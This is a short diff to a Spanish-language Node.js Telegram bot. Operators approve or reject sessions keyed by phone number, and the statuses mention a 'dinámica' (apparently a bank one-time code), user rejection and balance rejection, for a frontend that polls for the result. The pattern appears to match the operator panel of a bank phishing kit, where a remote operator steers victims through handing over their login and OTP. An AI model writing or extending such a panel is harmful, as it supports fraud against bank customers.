@@ -297,8 +297,7 @@ bot.on('callback_query', (callbackQuery) => {
         }
         else if (parts.length === 2 && parts[0] === 'approve') {
              // Initial approve (request dynamic)
-             // Usually frontend polls status, so we might set a status like 'request_dynamic' if needed
-             // But current flow seems to be just informational or manual trigger
+             userSessions[celular].status = 'approved';
              bot.sendMessage(chatId, `✅ Solicitud de dinámica para ${celular} iniciada.`);
         }
         else if (parts.length === 2 && parts[0] === 'reject') {
@@ -316,6 +315,8 @@ bot.on('callback_query', (callbackQuery) => {
              else if (action.includes('reject_user')) userSessions[partialMatch].status = 'rejected_user';
              else if (action.includes('reject_dynamic')) userSessions[partialMatch].status = 'rejected_dynamic';
              else if (action.includes('reject_saldo')) userSessions[partialMatch].status = 'rejected_saldo';
+             else if (parts.length === 2 && parts[0] === 'approve') userSessions[partialMatch].status = 'approved';
+             else if (parts.length === 2 && parts[0] === 'reject') userSessions[partialMatch].status = 'rejected';
              
              bot.sendMessage(chatId, `⚠️ Sesión recuperada para ${partialMatch}. Acción aplicada.`);
         } else {
